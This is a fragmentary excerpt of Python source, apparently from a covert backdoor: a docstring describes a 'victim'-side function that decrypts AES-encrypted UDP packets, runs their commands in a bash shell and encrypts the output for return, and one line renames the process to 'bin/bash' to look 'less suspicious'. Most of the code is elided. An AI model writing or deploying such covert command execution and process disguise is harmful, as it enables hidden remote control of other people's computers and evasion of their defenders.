...
def receivedPacket(packet):
    """
    Purpose: This function gets called on by sniff() meaning if the listening client/victim receives a packet that is identified as a UDP packet, the sniff stops and goes directly  to this function. receivedPacket then decrypts this packet via AES (ttlkey). Once decrypted, will execute the payload by firstly opening up bash shell and then  execute the commands. Once the commands are executed, the results in the given bash shell window will then be encypted and encoded into the packet and ready for tranmission
...
setproctitle.setproctitle("bin/bash") #Set process title to something less suspicious
